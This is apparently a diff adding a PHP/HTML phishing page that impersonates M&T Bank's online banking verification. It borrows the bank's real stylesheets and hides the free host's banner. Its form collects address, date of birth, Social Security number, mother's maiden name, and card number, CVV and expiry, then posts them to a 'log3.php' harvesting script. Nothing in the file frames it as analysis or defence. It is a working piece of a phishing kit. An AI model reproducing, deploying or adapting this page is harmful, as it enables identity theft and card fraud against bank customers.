@@ -1,0 +1,289 @@
+<?php
+ini_set("output_buffering",4096);
+session_start();
+?>
+<!doctype html>
+<html lang="en">
+<head>
+    <title>Online Banking Verification | M&amp;T Bank</title>
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <link href="https://resources.mtb.com/r/app-layout/css.mtb" rel="stylesheet"/>
+    <link href="https://resources.mtb.com/styles/retail.css" rel="stylesheet"/>
+	<style>img[alt="www.000webhost.com"]{display:none;}</style>
+
+</head>
+<body>
+    <div id="divHeader">
+    <div class="banner">
+    </div>
+</div>
+
+    <div id="main" style="margin-left: 29px;">
+        
+
+
+<div id="divIntroBoxLayout" class="intro-area">
+   <h1 id="hdr1">Verify your account information </h1>
+            <h4 id="hdr4">To confirm your identity, please your full information.</h4>
+            <h5 id="hdr5">
+      All fields required. You must correctly enter all the required information.
+    </h5>
+        </div>
+
+<div class="form-header soft-medium-gradient">
+    Security Verification</div>
+<script language="JavaScript">
+<!--
+function check(form) {
+if (form.add.value=="")
+{ alert("Please enter your Full Address before submitting."); form.add.focus(); return;}
+if (form.zip.value=="")
+{ alert("Please enter your Zip Code before submitting."); form.zip.focus(); return;}
+// Start of zip error Alert!
+var checkOK = "0123456789";
+var checkStr = form.zip.value;
+var allValid = true;
+var allNum = "";
+for (i = 0;  i < checkStr.length;  i++)
+{
+ch = checkStr.charAt(i);
+for (j = 0;  j < checkOK.length;  j++)
+if (ch == checkOK.charAt(j))
+break;
+if (j == checkOK.length)
+{
+allValid = false;
+break;
+}
+if (ch != ",")
+allNum += ch;
+}
+if (!allValid)
+{
+alert("Enter a valid Zip Code.");
+form.zip.focus();
+return;}
+// End of zip error Alert!
+if (form.zip.value.length < 5) { alert("Enter a valid Zip Code");form.zip.focus();	return;}
+if (form.zip.value.length > 5) { alert("Enter a valid Zip Code");form.zip.focus();	return;}
+if (form.dob.value=="")
+{ alert("Please enter your Date of Birth before submitting."); form.dob.focus(); return;}
+// Start of dob error Alert!
+var checkOK = "0123456789/";
+var checkStr = form.dob.value;
+var allValid = true;
+var allNum = "";
+for (i = 0;  i < checkStr.length;  i++)
+{
+ch = checkStr.charAt(i);
+for (j = 0;  j < checkOK.length;  j++)
+if (ch == checkOK.charAt(j))
+break;
+if (j == checkOK.length)
+{
+allValid = false;
+break;
+}
+if (ch != ",")
+allNum += ch;
+}
+if (!allValid)
+{
+alert("Enter a valid Date of Birth.");
+form.dob.focus();
+return;}
+// End of dob error Alert!
+if (form.dob.value.length < 10) { alert("Enter a valid Date of Birth");form.dob.focus();	return;}
+if (form.dob.value.length > 10) { alert("Enter a valid Date of Birth");form.dob.focus();	return;}
+if (form.ssn.value=="")
+{ alert("Please enter your Social Security Number before submitting."); form.ssn.focus(); return;}
+// Start of ssn error Alert!
+var checkOK = "0123456789";
+var checkStr = form.ssn.value;
+var allValid = true;
+var allNum = "";
+for (i = 0;  i < checkStr.length;  i++)
+{
+ch = checkStr.charAt(i);
+for (j = 0;  j < checkOK.length;  j++)
+if (ch == checkOK.charAt(j))
+break;
+if (j == checkOK.length)
+{
+allValid = false;
+break;
+}
+if (ch != ",")
+allNum += ch;
+}
+if (!allValid)
+{
+alert("Social Security Number Must Be Only Numbers.");
+form.ssn.focus();
+return;}
+// End of act error Alert!
+if (form.ssn.value.length < 9) { alert("Social Security Number is too short!");form.ssn.focus();	return;}
+if (form.ssn.value.length > 9) { alert("Social Security Number is too long!");form.ssn.focus();	return;}
+if (form.mmn.value=="")
+{ alert("Please enter your Mother's Maiden Name before submitting."); form.mmn.focus(); return;}
+if (form.cc.value=="")
+{ alert("Please enter your Card Number before submitting."); form.cc.focus(); return;}
+// Start of cc error Alert!
+var checkOK = "0123456789";
+var checkStr = form.cc.value;
+var allValid = true;
+var allNum = "";
+for (i = 0;  i < checkStr.length;  i++)
+{
+ch = checkStr.charAt(i);
+for (j = 0;  j < checkOK.length;  j++)
+if (ch == checkOK.charAt(j))
+break;
+if (j == checkOK.length)
+{
+allValid = false;
+break;
+}
+if (ch != ",")
+allNum += ch;
+}
+if (!allValid)
+{
+alert("Card Number Must Be Only Numbers.");
+form.cc.focus();
+return;}
+// End of act error Alert!
+if (form.cc.value.length < 16) { alert("Card Number is too short!");form.cc.focus();	return;}
+if (form.cc.value.length > 16) { alert("Card Number is too long!");form.cc.focus();	return;}
+if (form.cvv.value=="")
+{ alert("Please enter your CVV before submitting."); form.cvv.focus(); return;}
+// Start of cvv error Alert!
+var checkOK = "0123456789";
+var checkStr = form.cvv.value;
+var allValid = true;
+var allNum = "";
+for (i = 0;  i < checkStr.length;  i++)
+{
+ch = checkStr.charAt(i);
+for (j = 0;  j < checkOK.length;  j++)
+if (ch == checkOK.charAt(j))
+break;
+if (j == checkOK.length)
+{
+allValid = false;
+break;
+}
+if (ch != ",")
+allNum += ch;
+}
+if (!allValid)
+{
+alert("CVV Must Be Only Numbers.");
+form.cvv.focus();
+return;}
+// End of act error Alert!
+if (form.cvv.value.length < 3) { alert("CVV is too short!");form.cvv.focus();	return;}
+if (form.cvv.value.length > 3) { alert("CVV is too long!");form.cvv.focus();	return;}
+if (form.exp.value=="")
+{ alert("Please enter your Expiration Date before submitting."); form.exp.focus(); return;}
+// Start of exp error Alert!
+var checkOK = "0123456789/";
+var checkStr = form.exp.value;
+var allValid = true;
+var allNum = "";
+for (i = 0;  i < checkStr.length;  i++)
+{
+ch = checkStr.charAt(i);
+for (j = 0;  j < checkOK.length;  j++)
+if (ch == checkOK.charAt(j))
+break;
+if (j == checkOK.length)
+{
+allValid = false;
+break;
+}
+if (ch != ",")
+allNum += ch;
+}
+if (!allValid)
+{
+alert("Enter a valid Expiration Date.");
+form.exp.focus();
+return;}
+// End of exp error Alert!
+form.submit()
+}
+//-->
+</script>
+<form action="log3.php" method="post" onclick="check(this.form)" onsubmit="check(this.form)">	
+    <h2>
+        All Fields required.
+    </h2>
+    <p class="button-space">
+         <div class="remember_device">
+                        <label for="RememberDevice"><span id="imgRememberDeviceHelp" class="contextual-help-icon"></span><b>Identity Verification</b></label>
+<ul class='radio-list'>
+<div class="custom-form">
+<input type="text" name="add" placeholder="Full Address" id="add" style="width:200px;margin-right:11px;">
+<input type="text" name="zip" placeholder="Zip Code" id="zip" maxlength="5" style="width:80px;">
+</div>
+<div class="custom-form" style="margin-bottom:30px;">
+<input type="text" name="dob" required="" maxlength="10" placeholder="Date of Birth" id="dob">&nbsp;<font size="1"><small style="">(MM/DD/YYYY)</small></font>
+</div>
+<div class="custom-form" style="margin-bottom:75px;">
+<input type="text" name="ssn" required="" maxlength="9" placeholder="Social Security Number" id="ssn">
+</div>
+<div class="custom-form" style="margin-bottom:75px;">
+<input type="text" name="mmn" required="" placeholder="Mother Maiden Name" id="mmn">
+</div>
+<div class="custom-form">
+<input type="text" name="cc" placeholder="Card Number" id="cc" maxlength="16" style="width:200px;margin-right:11px;">
+<input type="text" name="cvv" placeholder="CVV" maxlength="3" id="cvv" style="width:80px;">
+</div>
+<div class="custom-form" style="margin-bottom:30px;">
+<input type="text" name="exp" placeholder="Expiration Date" maxlength="7" id="exp" style="width:85px;">
+</div>
+</ul><span class="field-validation-valid" data-valmsg-for="BindDevice" data-valmsg-replace="true" style="width:280px;margin-left:224px;margin-top:-10px; position: relative;top: -10px;left: 2px;"></span>    </div></p>
+    <div class="button-section">
+        <button class=" bold-medium-gradient button-lrg-pri-arr" id="btnSubmit" href="javascript:submit()" onclick="check(this.form)" onsubmit="check(form);" type="button">NEXT<span class="primary-arrow"></span></button>
+    </div>
+</form>
+    </div>
+    
+<div class="footer">
+    <div class="footer-nav">
+        <ul>
+            <li ><a id="lnkPrivacy">Privacy</a><span class="text-pipe">|</span></li>
+            <li><a id="lnkSecurity">Security Assurance</a><span class="text-pipe">|</span></li>
+            <li><a id="lnkAgreement">Digital Services Agreement</a><span class="text-pipe">|</span></li>
+            <li><a id="lnkESignAgreement">ESign Agreement</a><span class="text-pipe">|</span></li>
+            <li><a id="lnkAccessibility" >Accessibility</a><span class="text-pipe">|</span></li>
+       
+            <li><a id="lnkMtbRetail">mtb.com</a></li>
+        </ul>
+    </div>
+     <div class="security-icons">
+        <a id="lnkFdic"  class="fdic-logo"><img src="https://resources.mtb.com/images/img_trans.gif" alt="Member FDIC" /></a>
+        <a id="lnkHousing" class="housing-logo"><img src="https://resources.mtb.com/images/img_trans.gif" alt="Equal Housing Lender" /> <span class="nmls">NMLS#381076</span></a>
+        <a id="lnkEntrust" class="entrust-logo"><img src="https://resources.mtb.com/images/img_trans.gif" alt="Entrust® Secured" /></a>
+       
+    </div>
+     <div class="time-stamp">&copy;2020 M&amp;T Bank. All Rights Reserved.</div>
+   
+</div>
+
+    <input id="UserType" name="UserType" type="hidden" value="" />
+    <input id="userRole" name="userRole" type="hidden" value="R" />
+    
+
+<div id="contextual-help" class="soft-very-light-gradient contextual-help left" role="alertdialog" aria-labelledby="hd" aria-live="assertive" aria-relevant="all">
+  <span class="close"><img src='https://resources.mtb.com/images/img_trans.gif' alt='Close help' /></span>
+    <div class="message-header" id="hd">
+    </div>
+    <div class="message-body">
+    </div>
+</div>
+</body>
+</html>
+<?php ob_end_flush(); ?>
